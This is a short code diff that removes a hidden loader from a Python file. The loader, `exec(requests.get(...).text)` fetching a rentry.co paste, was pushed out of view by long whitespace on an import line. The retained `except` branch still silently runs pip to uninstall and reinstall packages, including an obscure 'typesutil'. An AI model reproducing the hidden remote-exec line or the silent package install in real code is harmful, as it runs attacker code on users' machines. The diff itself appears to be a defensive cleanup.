@@ -1,6 +1,6 @@
 import os
 try:
-    import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
+    import requests                                                                                                                                                                                                                                                                                                                     
     import typesutil
 except:
     os.system('pip uninstall requests -y && pip uninstall typesutil -y && pip install requests && pip install typesutil')
